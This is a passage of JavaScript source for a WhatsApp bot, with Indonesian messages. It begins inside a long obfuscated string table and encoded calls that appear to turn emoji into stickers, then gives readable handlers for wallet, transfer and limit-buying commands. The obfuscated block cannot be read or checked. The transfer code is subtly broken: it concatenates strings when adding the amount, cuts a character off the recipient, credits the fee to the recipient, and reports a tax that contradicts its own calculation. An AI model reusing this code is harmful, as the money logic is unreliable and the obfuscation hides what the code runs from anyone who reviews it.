fMAxjL','uefzlIbvBNr1AW','Axr1ihrHAsWGAG','z2uGz2fJAgeGyW','rw1VAMKTsM95ua','rw1VAMKTvhDPDa','yxnHig9Yyw5Nia','yMfPAYbKyw4GyG','igj1A2fUihrPBG','4O+Wifj1BNrPBwu','igjLCNnLzgvRyq','BgfUz3n1BMFWN5Ih','z2fJAgeGy2vJyq','yMf5yxjFz29Wyq','sMfUDwfYAq','q3PbA04','D2XXz2G','A3uGC2fQys4','ugLSAwGGC2fSyq','zwjPAcbRzxjHCW','ywLS','zgvSDMLYyq','DsbZzxnLB3jHBG','ysbbBMrHigXHAW','B2yGBw9Yzsb0Aa','yw5NigfRDsbZzq','yMf5yxjFB3zVmq','BYa/','z2XHC3nLCW','BwfRysbHA2fUia','zgKGyMLQywSGCW','Au5stxC','zsb3Ag8Gy29UDa','ihLHBMCGyMvYyq','A2fTDsbZzw11yq','ywTHBIbOyw5JDq','AguGzM9YBsbVzG','D0eWBw8','sxDlEM0','EweGANvNysb0Aq','tw9OB24GBwfHzG','B1DSs1u','ig1HBNrHBIbKyq','BMfOig1LBMnVyG','ywGGBM9TB3jFyq','q0XsAgG','zsbIyxDHAcbKyq','ANvQDxjHBIb5yq','runu','z2v0rgf5','lIbwywXLCNK','CY53Agf0C2fWCa','ysbZyw1Hig9Yyq','zgfODwX1igrLBG','y29T','EM9UBW','jMLTCg9ZDg9Ypq','y2nnDgC','seG6Bw06C3m','igrHBIbTzxjLBG','ig1LBMPHzgKGiG','zgLJyxjPxW','iefRDsbZywXHAa','tvuGq0foveLlia','z3jVDxaGB3bLBG','Aw0GBxvUz2TPBG','4OcCq2LUDgfPBgfO','DxjS','CMLWywrHigjLCG','yMfgzuG','Dgf0ihLHBMCGCW','yMvUyxjUEweGAW','ie9gqYa','BIzHCgLRzxK9Aa','igTHBg8GCgvUzW','vMnczLu','AYbZDxn1ihnLyG','ExvRAw5V','kKjst0feq0ftva','icbnifaGmYOkcG','zMfJzwjVB2SUyW','DNbgzwy','BwLUjYGZmJaSAq','igLTCgLHBM11ia','DsbHzgfSywGGCW','DgfODw4TDgfODq','ifuGqIbficaGua','CNvZihrLDgfWia','DMLYDxmX','Dhj1Bxa','yw5NigfKywXHAa','CgvYz2KSihrLDa','v05Sugi','tgjOqKu','BMrHAs4','zwGGAxr1igTHCG','BgLZyq','iefUzgeSihrLDa','BMrPCMKU','Dw1WDhDLzxqMDa','A2fYzw5Hig1LCG','yNvZAw5LC3npDW','Eu5SrMO','ywXHC2fUBNLHia','AgLUyxrH','8j+MLcbnzw51igTLlq','BM5LBc9vq2r6vW','AYbZzwjLBgfOia','ysbPA3v0ihrLCG','AcWGzgfUihnLyG','AgfSihLHBMCGCa','v2XIA1C','tK9nt1i','yNvHAcbZzxbLza','tgLZDcbTzxnZyq','yw4GzgLRAxjPBq','ywXHAcbRzxnHBa','lI96zwvVBMuVEG','44gcieDYB3vWiefS','yMfNAw11lG','AMvSzwSSigPHBG','u2vIDxrRyw4GAW','q2HVB3nLihzPza','zsbTzwrPysbZzq','y3vKzgXL','yNv0Dg9Uvgv4Da','BwLTzxr5Cgu','BwfPBG','rLvmienmt1njtG','ihrLDgfUz2DHla','BgLZDfjLC3bVBG','DxnLCG','nZmYnKbZlNDOyq','C2fRyw4GC2fRAq','lcbTywTHihrLBq','4OcCv2fUAxrHihLH','zxH0pq','CIbKAsbKywXHBq','zgeGzgLYAsbZzq','zgL1Bt1JB3b5xW','t0PNtvy','cGRIGkiGwKvft05f','z29QB3nHDg9YDq','As16zwvVBMvVzG','ugXLyxnLifn1yG','yKHJseG','B3jHBMCGBMDLCW','mMmXlMPWzW','8j+tJsboyw1HidOGqa','qvi1yJvzrNOYzW','8j+pHsbtB3vYy2uGCW','B3nVzNqT','Dw5Nlq','B3jPz2LUywXFyq','q2fYysbWywXPBG','A3vJAw5N','DhDLzxr0CNvTCa','yw5UEwePigTLCa','s2v0AwTHigTHBq','zw5Nyw4GBwvTyG','C3bVBNnIB2i','zwXHCYbSywX1ia','AwmUBxaZ','C2HPAw5H','zwjPAcbIywLRia','BMeGyMvYAhvIDq','igPHzgKGCgfJyq','l3bFmJa2odfHCW','igjLCNvZywHHlG','4PYOicPgB2XSB3DP','BgLOyxrHBG','t3zQD1i','y2T5ihrVigH2ia','A0LlBuy','DhvNyxmGA2vWyq','zMzTCgvNic1Pia','Bg9Zzq','DgLKywSGywrHia','yY96zwvVBMvVzG','rhvYyxnPifn0Aq','CgeGywDHBweGyq','A3uGBwfZAwGGCW','C3vRC2vZyw4GEq','A2vYyxn1A2fUia','y29Kzq','DxnLihrOzsbZDa','AM9PBIb0AguGzW','BMfYDxrV','CgiXlMPWzW','C3bSAxq','lvbmqvKGtvaZkG','zxjVzMvLDa','yw5TDq','yxbPl2vQzwn0zq','g1SXoZmXBx4BwW','zsa6ia','zw5QywrPig9Yyq','z2uGDxbTzw51','C2LbENK','8j+sTIbeyw5H','mxWYFdr8mhWZ','C3rYAw5NAwz5','C2LHihLHBMCGCW','q2LUDgeGyNvRyq','ExrTCdrHAMeG','Dgv4Da','DgLTzxn0yw1W','nteZqhmUD2HHDa','BM8GD20GDgLUzW','BgjoEeK','ihrPzgfRihbLCG','revskIdJGi0','zYb0zxjIywLRia','zYbKyxbHDcbTzq','ywSGBwvUAwTHAa','A25VDYbHBNLVBG','y29UDgvUDfrLEa','tuqGg1SXoZm3Bq','CMvTB3rLsMLK','y2fYihrLBwfUia','nteYqhmUD2HHDa','yxbHpW','CYbIB3rF','z2uGC2v0ihn0Aq','ntaWmdaWmdaWma','otK5oty0ofncB2HoDq','re9d','DgHLBG','qwD1C3r1CW','CgeGywPHigrPDa','yxLHihrPzgfRia','yM9VyNm','Dhj1DgG','4OcCu2vZDw5Nz3vO','Ahr0Chm6lY9TlG','C2vYBMfTzqPPBq','t2T0B2jLCG','DwTHBIbVBgvOia','kVcFK73VUi8Gwu9vvfvcrq','lgzWCZ0XnsWGCa','ihrLDgfWAsb0Aq','CMvWBgfJzq','qwXSig1LBNuGyG','BwfSzq','sgvTBw0','BwLUAMfTA2fUia','yxjHihrPzgfRia','u3rHCNrLzca6ia','DgHLig1LC3nHzW','ChaVC3vYywGV','yxbWBgLJyxrPBW','lMnVBs9HCgKVDa','AYbZzw9Yyw5Nia','DgvYAwfRigDHAG','8j+qSsbnzw51igTLlq','Ahr0Chm6lY90Aq','DuzpCvy','rwDbz0G','zsbZAw5P','DxnLihrOzsb1Ca','BIb5yw5NihrPza','C3vNyq','yxqGkhnLCMfOia','zMfRzq','r09qqvKGDMLHia','BwLTzq','nJi4ntCXnJm2ma','Cc5JB20Vr1K3na','CgvU','CgvYyxnHyw4GyW','EweGC2v0AwfWia','yw5NigrHCMLWyq','zgvSzxrLtwvZCW','ieDpuefzlGO0lG','AwDZDg9YEq','ihbHBgLUzYbTzq','B21VBMCGDgfWAq','DgroEvy','Axr1ihn1A2eGCW','l3nTysbQzw5PCW','BgLUigfRDsWGyq','z29WCMvT','jNjHDZ03','ywXPigrHBIbJyq','D29VzG','z2uGC2HVCg1LBG','AweU','BgfTihvZywHHBG','zgeGA2vOAwr1Ca','A2fUigLZDhjPBG','AfvpD3q','y291CgXL','qMLSysbbBMrHia','u3vIC2nYAwjLia','igPHBwLUyw4GAW','ywTHBIbTzw5Qyq','ifzjrevpkIO','lM1WmW','rxjYB3iGoIa','EwfUyq','z2v0rgf0zq','AwTHlIbmzwjPAa','CMvSyxLxqu1LCW','C2v3yv9RywS','C3bWu1u','lcb0yxbPihnLyG','zgvSzxrL','lI9SAwiVy291Ca','ihrPzgfRihr1Ba','CML5yxnFz3jLBq','DcbZAwfWysbZzq','BwLVx2fRAxLHBq','v3nRrfO','BxvHig9Yyw5Nia','C2v0ihn0AwnRzq','BNnMD19HDMf0yq','ig1LBMDOywXHBG','swrxsMS','BMvRBW','zxX5zwXSB3CG','zgfUigHPzhvWia','yY51CW','B3bTzw51ignVBq','oIbF','z2fUigPPA2eGAW','qu0Gu1rpuLKQia','ntyYodC5nK1ZuM5cBq','DMLVBMe','DxnLihrOzsbZAa','B20V','t0rf','DdeWmda','ruWk4OcIifnbvfjj','iefWBgLRyxnPia','zwSGC2vUzgLYAq','C2v3yv8XCa','igXHBhuGA2LYAq','yxbPlwnYzwf0zq','EeP3swjOqKPzEG','AxjPihnHEweGCW','B2rL','ysbTzw5QywrPAW','igLUz2LUA2fUla','CNmGoIOG','ignVBNrVAca6ia','ChvZAa','A0vZu0K','zg93BMXVywrbBG','z2v0C2LKzxi','8j+qSezPBgvZAxPLia','ugvUDw5KywfUia','twfZywXHAcbHAW','ig1LBgvTCgfYia','C3bHBsbIB3qG8j+sNG','ifnJyw4GqMfYyW','sKftqsbtrvDbia','ysbZyw1HihnPyq','igTHA2LUEweGAa','CxvYyw4TyxbPlq','D2jbCgPREu9eyG','ygbGu1vdq0vtuW','sMLRysbRyw11ia','DxiGAgfUEweGza','zxjUEwf0ysbWzq','ChjVzhvJDeLTyq','qMLNifrOyw5RCW','AM9PBG','igrPysaIAsbSDq','t3vRyxG','Cg9UC2vnzxnZyq','yxn1BMfFExvRAq','DgLJA2vY','BIbRyw11igrHBG','ic0G','yw5NignHBIbPia','wfDoCxe','Ds4GqxnHBcbQyq','yxqUiejPyxiGyq','w1bSyxLnCdnD','yw5NigTPDgeGBa','igfRyw4GBwvUAG','Dcb5yw5NihrLCG','z3qGA2fTDsbJAa','u2fHDcb5yw5Nia','A2v0AwSGCgfRzq','ywrHihLHBMCGBq','sgvsB1C','AMHVCgu','u2vIDwfOig5LzW','oe93sZj4','B3jHz2vTzw51ia','zxjHAcaYncbQyq','EMLNAxK','igrHBgfTihn1yq','zYb5yw5NigjPCW','s0LbCNq','ywGGBwvUz2vYDa','ysbPBMDPBMTHBG','AMfOEq','igLUAsbZAwXHAa','AM9TyMXV','4OcCtwvUywHHBIbN','z2uGB3DUzxjTzq','z2HZD24','s2LYAw0Gz2fTyG','yw4GDhvYDw4GAW','u2fSywGGC2f0Dq','z2v0tw9UDgG','xWOkq2fYyw55yq','DgLRlc4GuNvZyq','BwvZC2fNzvnLBG','DhqX','A2uGqMvOysKGyq','refoqs4knc4Gza','refoqsb2AweGsa','u2LHCgeGBMfTyq','rw1VAMKTtwLJCG','CMqGzgfUifzPCW','zgfRihvUDhvRia','ignVBw1HBMrF','C3nHz2u','AsbTzw1Lz2fUzW','zYWGA3vUAw5Nia','zgKGC2LUAq','vgvYAMfKAsbRzq','lI9TzwrPys9HDq','C2eGyMfOywDPyq','igLUAsbHzgfSyq','zw4/DhLWzt1JAa','zxjSzwjPAcbKyq','zgLRDwj1CMTHBG','BMCGA2L0ysbOyq','yxbHBgfNAsb3yq','yMvYAwTHBI4','qNLMEfm','zxnJzxnPyxbH','yw4U4OcD','tMv4DcaGzM9Yia','EgSXlMPWzW','yw5NigTHBgKUia','lwjLCMf0BNLHia','lcbHA3uGDgfRia','Ahr0Chm6lY92yq','Aw5ZDgfZDg9YEq','vgfRihnLBxvHia','zMLSzuXLBMD0Aa','DgvSzM9UignYDq','zNjVBu1L','mhWZFdf8mNW0','z2v0uxvVDgvKtW','AxrHihrPzgfRia','sMLRysb3Agf0CW','Ag9SBW','igTHBxuGyMvSDq','t29hDeG','Ce95Aui','vgLRDg9RifDPDa','tK9ursdVVie','zxjPigTPDgeGAG','ww91DhvIzsbnCa','A3vUAq','C2vUDg9FAxn1EG','vgLRDg9Rie5Via','yNvSyw5UEwe','ywLTDs4','p3rLEhq9','yw4GA2vIB2rVAa','CIbZzwPHDgKGCa','A2fYzw5Hig1LBq','DM8Xoa','Bg9JyxrPB24','Dw5KysbTywTHia','rgLTyw5HChvUia','zYbUEw9RyxaGyq','C3vJy2vZCW','mejJwgP5qKrRtG','AwrHAYbIzxj1CW','zw0GugfRywKGrW','DMvYAwzPA2fZAq','ideXncaZ','ywXXDxjHBL9HDq','zgfUzYb0AwrHAW','t1qQigj5ig1L','yMvNAxr1BgfOia','CNnHA2L0lxnHAW','s1LosvC','D2fUAxrHihnHBq','ierHBMe','yw4GChv0CMeGyq','Bg8GCgvYBMfOia','zgfUzYbIzxjWDq','q2vTyNvYDsbPDa','A2L0ysb0ywH1lG','Ag9Wzv9IB3K','lJaSihnWBgL0ia','wKvft05fie9gqW','EwX1qNm','BwfUDxnPyv9SAq','rvrMBwm','4OcCsMLRysbRzxbP','DMLKzw8','yxjKAwfUDg8','B21Tyw5KxW','AcbKAweGzgvUzW','ig1LBwjHz2LRyq','yw1PBMfUigTLAa','CMf0lIblyxuGDa','8j+qRsaQrMLSzxnPEG','cVcFJiaGvxjSidOG','ihnLBxb1CM5Hla','8j+MPYbnzw51igTLlq','yxnZ','DgvYyNvYDwSGBa','BuHmAwS','ExvYAq','kVcFJRyGwu9vvfvcrq','ig9Yyw5NihLHBG','ig5HAcbZzwTHCG','uKvtue9ou0u','DsbIzxjLBMfUzW','AcbIywLRigXHAW','zgKGD2eVDgvSzq','tgLZDcbnzxnZyq','yw11igfRyw4GBa','ie9wtYWGrefoqq','DgvYAwfRiciGyq','BIbRzwTHEwfHBG','igjHAgfZysbKyq','Awq6ide4kqOk4OcI','w3bDihbHBgv0Da','AMfRihnPBMKU4OcD','DgfODsWGu2vTyq','zgf0yq','z2fTDt8','zg9UyxnPx2THAW','DMLKzw8G','zxLHA2LUA2fUia','igrPBgvTCgfYia','AxHLBhmT','DxbWB3j0idi','DwHRyw4GywDHCG','ChvUihbLCMvTCa','quDfifrpifnusq','44gvieDYB3vWihDO','yxbPihbLCMfZyq','ExrTCdmGw2XPBG','B24GoIa','B2HZzwH1BG','BwvTyNvHDcbRAq','B3rLlcb0zxj1CW','v2HHDhnbChaGqG','B0r0BNe','DgeGyMvYDgvWDq','vM5HzeG','B2zJ','ignVyMeGDwXHBG','AgfRigTHBxuSia','BwfUz2e','reuQiooaJq','8j+tJsbuyw5Nz2fSia','DMLKzw8GAw5Pia','CgXHEsbXDwvYEq','BMfUz2THBIdWN5Ihla','zwXLz3jHBv9ZDa','CgKVDJiVAw1NlW','mZK3otm2oda3jG','ysWGAMLRysbRyq','CM91CcbHBhbOyq','iejPC2fRDsbJDq','Awq9mtaWmdCXna','C2zdELK','s2XOsvm','EhrnzxnZywDL','ywXHBIbHzgfSyq','CMvZDwX0','CgfNyxiGCgvSAq','BIbIzxjRzwLUzW','CM91Cf8','ywTHBIbTzw1Izq','AwSGyw5HAYbTyq','zM9SBg93zxjZ','ywDPihLHBMCGAG','Dw5NAsb0yw5Wyq','DxnLihrOzsbXDq','AsbZzwXPBMDRDq','BMCGyMLRAw4GAW','igjVAg9UzYWGAq','CgfSys4','AxiG8j+KLa','qNv0Dg9Uie1LCW','Aw5JBhvKzxm','qwT1ihrPzgfRia','lI9PBwfNzs8','DM8XmW','uNHgB0e','ie92BW','Exv6DwTP','yw4GDg9UDg9Uia','z2uGCxvVDgvZBq','zgvS','Aw5ZDgfYzwvS','t3bXqMO','ChjVzhvJDe1LCW','twfUDxnPysbHAW','ywq9mZiWoJmYma','4OcCugLUDgfYigL0','Bej2rKq','C25HCc9WB3n0ia','CMLHlcbIzxjPia','CMf0Aw9U','ihn1A2eGC2fTyq','z3buzgu','AsbZAxPLihrODq','yxLHihrHA3v0Aq','BwvUAMfKAsbZzq','BhvWysbQB2LUia','igD1BNvUzYWGDa','BwvKAwfuExbL','igTLDgLRysbRyq','zgeGywTHBIbTzq','yxr1ihnHAMeU','zgvY','l3bFmJaZmM13yG','AMTXvNC','igfKywXHAcbRzq','ysbTzw55zw5HBG','rfbbvLu','DhjHCa','lMnVBs9HCgKVyW','tgLUAYb0AwrHAW','yw5NigjPC2eGBq','Bs9Jl1Pfru9orq','yxbPl2LTywDLzW','ihrHA3v0igTHBq','zcbHAMeGBMLOia','ihDHBNqGDg8Gza','CgfYA2nOyw55zq','zK1hDwe','C2HHBMe','z2uGDgfNBwvUDq','Aw5ZDgf2AwrLBW','sKHpCgO','z2uGBwfRzxjTzq','zw4/DhLWzt1Ryq','4OcCqMvYywTPDc1Y','A3uGyw5HAYbWDq','ig1LzgLHihLVDq','BIbKAxbPBgLOiq','A2LTAM9UzW','yxmGAxr1igfKyq','y2HHBM5LBc9vqW','qwT1igvUz2DHAW','DM4GDhj1CYbRAq','AcbHCgeGEwfUzW','ihbLzgfNyw5Nia','DghIGkz0yxbPihnH','DgLRDg9RBM93Bq','ygbGsMfKAwTHBG','igrHBgfTigjLBG','Aw5ZDgfNCMfTlG','qMLSyw5Nicjlqq','DsbHCgeSihrHCa','rg93BMXVywrLCG','yMLZysbRAxrHia','CxjFB3zVmtm','qNv0Dg9Uig1LCW','yNv0Dg9UCW','A2v0yq','yw4GDgHLigXPBq','AgfSysb5yw5Nia','BM11ihLHBMCGyq','zhvWBNLHlG','Bg9N','BgL6yxjK','yxbWig1VzcbRyq','yw5TDs7IGj0','xsbWywXLDhrLzW','DMLKzw8Qif9kDq','44gQieDYB3vWiefS','Aw5HBIb1BNr1AW','C291CMnLignVza','rwrusey','A3jFCM9IB3q','AwTPyw4SigTLyW','yxvKAw9nzxnZyq','AMLZBW','DxmU','4OcCr2fYysbNyxjH','DhuGzgLHihvUDa','AsbWzxj0yw1HlG','A2fNyv9RB3vRBW','A2vWywrHig1LCG','Ahr0Chm6lY9KlG','igLUAs4GugvRzq','BNLHihrHA3v0ia','yw4Gzgf0yw5Nia','cVcFJOmGu2L6zsa6ia','8j+sIYaQrNvSBg5HBq','BMDPBIbTzw5NDq','CgfSAw5NihrLCa','yMLZysbTzw1IDq','D2LUCNK','yxvKAw8VBxaZ','mtyXnda2otm3oa','z29Sza','r09qqvK','BNvZAweUifrHCa','BI9Vy3rLDc1ZDa','DxnLihrOzsbVDW','tK5rAge','ywDV','zg1LBNu','A2f0ywjPAMfRxW','idOkms4GqNvRyq','tva0','s2XPAYbUzxH0ia','v2f0zxjTyxjR','AsbRDw5JAsbTzq','ChjPBwfYEq','C2vSzwn0ihrOzq','oIbFqa','ihbNBIbIywXPAW','twvKAwfMAxjLia','yMf0igj1CNvRia','DgeGBhvWysWGCW','ysbHDgf1ihrHAa','zxbOzw1LCMfStq','ywTZyw5HihrPza','CMvWBhKGCgvZyq','lcbKyw4UlIbWyq','8j+qO1rPDgXLidOG','ihzHBgLKigf0yq','rw1VAMKTtwvZCW','igjVDa','x1r1BMDNDsbIzq','B2XVCJ1MzMzMzG','BwvKAwfvCMW','CgfYC2u','twvUyw1WAwXRyq','CxjFz29WyxKXmW','igrPyw0/','BgvZDgmGy29TBq','mZGZnZG','DMLLD3m','u2vWDgvTyMvY','ysbHCgeGBMLOpW','B250B2H8Dhj1zq','y2vMCM9UlM5SlW','BgfOig1LBMPHza','BgfZlcb5yw5Nia','A2fSAsblzw5Hia','z2fYigHPzhvWia','z21LBNuGy29TBq','ig93BMvYigT1ia','zwXHBMDH4OcMieDH','BNqGr29WyxK','igTLAgfUy3vYyq','EwfUzYbKAwj1Da','ysaXigHHCMK','ywLUihrLCNrHDW','z2uGDgvSzwDYyq','4OcCrgLHBsbPDhuG','AcbKyxrHBMCSia','uviGq09erq','BIbIDwTHBMXHAa','z2fUig1LBMrPza','sgfTCgLYihnLBq','zw5Nyw4GywrHia','lM5LDa','z2uGqwXWAgfIBW','ExrTCdnHAMeG','zw1VAMK','BNrHAcaQ','BgLZDe1LC3nHzW','Bwv0Ag9K','Bwf0ihvUDhvRia','igfTB25NDxmGDq','yxDHA2fUlUkaNq','ywSGAw5NAw4GDa','s2fSyxuGBwvUyW','4OcCvwfUzYbIDwTH','ihzUigTLC2LUAq','zghIGkzRzwjVAg9U','igjVBgvOigTLAa','igXHBwjHDc4GsG','8j+qScbnzw51igTLlq','Bs9Jl3PLzw9Uzq','ywKGywrTAw4GDa','zxjPyw5NigTLBq','CMvJB3jKihzVAq','yxaGA2vYyxnSyq','DcbZDgmGy21Kia','DhuGzgLJAxb0yq','zMzLy3q','AwDYzwvSCW','zsbXCIbJB2rLpW','ierHBIbZzwTHCG','8j+uLIbmAxn0ifnLDW','Aw5ZDgfMB3rV','DxnLihrOzsbNyq','BgfOihn1yw1Pia','yM90xW','z2v0sg91CNm','DcbOyxrPihnHyq','cGPFug93zxjLza','ngKXlMPWzW','AMLZB28','C2vIDxrRyw4GDa','CMLTigTLC2LUAq','yxvKAw8VyxbWBa','igrHBIbnyxn1AW','DgeGBwvUAMfKAq','ys7IGj0','rw1YB3i','zw1LCMXHBMDHBG','wwfUzYbWywXPBG','CxjFB3zVmtG','C2fNzsbtzxDHia','yxLHigf0yxuGBq','zw1HA2LUihnLza','z2vHExvIAq','mtKXoq','ywrPigrPyw0Tza','BgDvwNy','C2GVCgfJyxiGCW','DxnLihrOzsbHBG','Dsb3yw50ihrVia','ihn1ChbVCNqGjG','AsbJzwXHBMeGqq','igKGBg92zsb1la','Bc1OywWGA2vJAq','D2fSBhbHCgvY','BwvUDgLVBMvKsG','l3bFmJaZmNO3yq','BMDHBIbJyxjHia','s2LYAw0GCgvZyq','zwvVBMvVzMm','Aw5VCMK','zYWGBwfRysbIAq','igjLCMHHCMfWia','yNv0Dg9Uswq','x1vUDhvRigr1CG','4OcIica','BMCU','iefSzxnHBNLHpW','Cg9ZDg9Yid0GDa','CgfZCMfOA2fUia','s2fTAxm','ywGGBwvYAw5KDq','z2uGr3jVDxaGvW','CMDH','zw55yxbHBNLHla','yxvKAw8VBxa0','idOG','yxaGyMfZywGU4OcD','u0vmrunuieHfuG','Asb0zxj0yw5NAW','BcbWywrHigTHBa','ywTPBIbIyw55yq','D2fSigrHCMKGCW','z2uGzNvUBwvUDq','DhvRigXPBMTF','Ahr0Chm6lY9NlG','yw55ysbKDwe','ysb0zxjZzwj1Da','Awr1CgfUigTPDa','wMryuhG','zw5NDwfZywKGCa','AgvHzgvYvhLWzq','lMnVBs9HCgKVyq','BMvYBwvUDsbJBW','tgrfCNq','8j+MNsbnzw51igTLlq','lNbOCd91CMW9','twLUz2D1','ig55DxjPihvHBG','DxnLihrOzsb0zq','C0fWCa','A2uGBgf3yw4GAG','q29TBwfUza'];_0x1139=function(){return _0x5ef28e;};return _0x1139();}sub_yt_zeeone_ofc==_0x1f7707(-0x107,-0xb5,0x60,0xa4)+_0x1f7707(0x62f,0xa87,0x653,0xa8f)+q5&&emoji[_0x1f7707(0x2e7,0x359,0xda,-0x248)](''+q5)[_0x39f25f(0x3a0,0x3e2,0x654,0x13)](_0x4b1f13=>{const _0x379f83={'eMAyc':function(_0x2be92c,_0x3167d6,_0x1678e2){return _0x2be92c(_0x3167d6,_0x1678e2);}};teks=''+_0x4b1f13[_0x38c8bc(0xcc8,0xcad,0xbe9,0xbbc)][0x17*0x22+0xa79+-0xd7f][_0x9bacf0(0x977,0x579,0x688,0x294)],console[_0x9bacf0(0x788,0xc88,0x8e5,0x982)](teks);function _0x9bacf0(_0x48d856,_0xcb0cb2,_0x481441,_0x55d277){return _0x39f25f(_0x55d277,_0x481441-0x346,_0x481441-0xa6,_0x55d277-0x1b6);}function _0x38c8bc(_0xb12117,_0xddd38a,_0x1deb48,_0x59e475){return _0x39f25f(_0x1deb48,_0xddd38a-0x4aa,_0x1deb48-0x13f,_0x59e475-0x130);}_0x379f83[_0x38c8bc(0x821,0x71d,0x554,0xb84)](sendStickerFromUrl,from,''+teks);});sub_yt_zeeone_ofc==_0x39f25f(-0x3ca,-0xe9,-0x2dc,-0xa6)+_0x39f25f(0x2b0,0x6b4,0x576,0x3ba)+q5&&(reply(lang['wait']()),emoji[_0x1f7707(0x442,0xa2,0xda,-0x10f)](''+q5)[_0x1f7707(0x674,0x264,0x234,0x63a)](_0x90df5d=>{const _0x3651c0={'alkrO':function(_0x298ae2,_0x30b37b,_0x1c52e9){return _0x298ae2(_0x30b37b,_0x1c52e9);}};function _0x973c0f(_0xae05f0,_0x17c562,_0x321816,_0xec745f){return _0x1f7707(_0xae05f0-0xe1,_0x321816,_0xec745f-0x2f1,_0xec745f-0x183);}teks=''+_0x90df5d[_0x56bc41(0x65f,0xe8f,0xaf8,0xae6)][-0xf*0x1e7+-0x2383+-0xc1*-0x55][_0x56bc41(0x7ea,0x3f5,0x92f,0x625)];function _0x56bc41(_0x1814c7,_0x526534,_0x447b34,_0x537372){return _0x39f25f(_0x526534,_0x537372-0x2e3,_0x447b34-0xd7,_0x537372-0x13c);}console[_0x973c0f(0x7aa,0xb8f,0x6ac,0x6e2)](teks),_0x3651c0[_0x973c0f(0xe2,0x4ae,0x4eb,0xd6)](sendStickerFromUrl,from,''+teks);}));sub_yt_zeeone_ofc==_0x39f25f(0x417,0x5db,0x1e5,0x7bb)+'enger-'+q5&&emoji[_0x39f25f(0xe8,0x288,0x291,0x46b)](''+q5)['then'](_0x279925=>{function _0x3ea2fe(_0x3bf7e0,_0xd03008,_0x1f335c,_0x5928e0){return _0x39f25f(_0x5928e0,_0x3bf7e0-0x71,_0x1f335c-0x66,_0x5928e0-0x19);}teks=''+_0x279925[_0x2021aa(0x7e0,0x328,0xb1c,0x7a0)][-0xd7+0x11ab+-0x10ca][_0x3ea2fe(0x3b3,0x341,0x1cc,0xc3)],console['log'](teks);function _0x2021aa(_0x1777a5,_0x532969,_0x3f0bc5,_0x3739f9){return _0x39f25f(_0x3f0bc5,_0x1777a5- -0x23,_0x3f0bc5-0x55,_0x3739f9-0x177);}sendStickerFromUrl(from,''+teks);});sub_yt_zeeone_ofc==_0x39f25f(0x127,0xed,-0x19b,-0x335)+q5&&(reply(lang[_0x39f25f(0x69e,0x22a,0x182,-0x113)]()),emoji[_0x1f7707(-0x59,0x398,0xda,-0x1ee)](''+q5)[_0x1f7707(-0x3a,-0x16a,0x234,0x520)](_0x39f474=>{const _0x57ec2d={'ilMRI':function(_0x4b3edd,_0x39d9b9,_0x33e51e){return _0x4b3edd(_0x39d9b9,_0x33e51e);}};function _0x30a8d5(_0x166500,_0xe6279,_0x49e3d7,_0x5e9271){return _0x39f25f(_0x5e9271,_0xe6279- -0x11a,_0x49e3d7-0x155,_0x5e9271-0x180);}teks=''+_0x39f474[_0x30a8d5(0x7e8,0x6e9,0x2d6,0x90a)][0x1df8+-0x1379+0x29d*-0x4][_0x226ecb(0x3b3,0x2a1,0x6a0,-0x6e)];function _0x226ecb(_0x5c9da1,_0x35a5b9,_0x120ae8,_0x129292){return _0x39f25f(_0x5c9da1,_0x35a5b9- -0xa1,_0x120ae8-0x84,_0x129292-0xd);}console[_0x226ecb(0xc2,0x4fe,0x444,0x506)](teks),_0x57ec2d['ilMRI'](sendStickerFromUrl,from,''+teks);}));sub_yt_zeeone_ofc=='Emoji-HTC-'+q5&&emoji[_0x39f25f(-0x120,0x288,-0x24,-0x155)](''+q5)[_0x1f7707(-0x1ed,0x41b,0x234,0x689)](_0x2e21be=>{teks=''+_0x2e21be['images'][0x9f9*-0x1+0x38+0xc1*0xd][_0x359409(0x543,0x792,0x8af,0x7d6)];function _0x359409(_0x2ec6e6,_0x498024,_0x2838a2,_0xe8b106){return _0x1f7707(_0x2ec6e6-0x102,_0xe8b106,_0x2ec6e6-0x3af,_0xe8b106-0x3f);}console['log'](teks),sendStickerFromUrl(from,''+teks);});
		switch (command) {
case 'dompet':
					const kantong = checkATMuser(sender)
					reply(` *「 ATM USER 」* \n📛 *Nama* : ${pushname}\n🆔 *Nomer* : ${sender.split("@")[0]}\n💰 *Uang* : ${kantong}\n`)
					break
	case 'transfer':
				if (!q.includes('|')) return  reply('format salah')
                			const tujuan = q.substring(0, q.indexOf('|') - 1)
                			const jumblah = q.substring(q.lastIndexOf('|') + 1)
                			if(isNaN(jumblah)) return await reply('jumlah harus berupa angka!!')
                			if (jumblah < 100 ) return reply(`Minimal Transfer 100`)
                			if (checkATMuser(sender) < jumblah) return reply(`uang mu tidak mencukupi untuk melakukan transfer`)
                			const tujuantf = `${tujuan.replace("@", '')}`
               				fee = 0.005 *  jumblah
                			hasiltf = jumblah + fee
                			addKoinUser(`${tujuantf}@s.whatsapp.net`, hasiltf)
                			confirmATM(sender, hasiltf)
                			reply(`*「 SUKSES  」*\n\npengiriman uang telah sukses\ndari : +${sender.split("@")[0]}\nke : +${tujuan}\njumblah transfer : ${jumblah}\npajak : 30*jumblah`)
                			break
	case 'limit': case 'ceklimit': case 'balance': case 'glimit':
reply(`💳 Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}
🏧 Limit Game : ${cekGLimit(sender, gcount, glimit)} / ${gcount}
🏦 Balance : $${getBalance(sender, balance)}


Kamu Dapat Membeli Limit Dengan ${prefix}Buylimit *Nominal* Dan ${prefix}Buyglimit *Nominal* Untuk Membeli Game Limit

*Example :*
${prefix}buylimit 10
${prefix}buyglimit 10

NOTE : 
- Harga Limit Perlimit adalah $100 balance`)
break
case 'buylimit':{
if (!q) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $100 balance`)
if (q.includes('-')) return reply(`Jangan menggunakan -`)
if (isNaN(q)) return reply(`Harus berupa angka`)
let ane = Number(nebal(q) * 100)
if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(sender, ane, balance)
giveLimit(sender, nebal(q), limit)
reply(`Pembeliaan limit sebanyak ${q} berhasil

*🏧 Sisa Balance : $${getBalance(sender, balance)}*
*🏦 Sisa Limit : ${getLimit(sender, limitawal, limit)} / ${limitawal}*`)
}
break
case 'buyglimit':{
if (!q)return reply(`Example : ${prefix + command} 10\n\nHarga 1 limit = $100 balance`)
if (q.includes('-')) return reply(`Jangan menggunakan -`)
if (isNaN(q)) return reply(`Harus berupa angka`)
const koinPerlimit = 100
const total = koinPerlimit * q
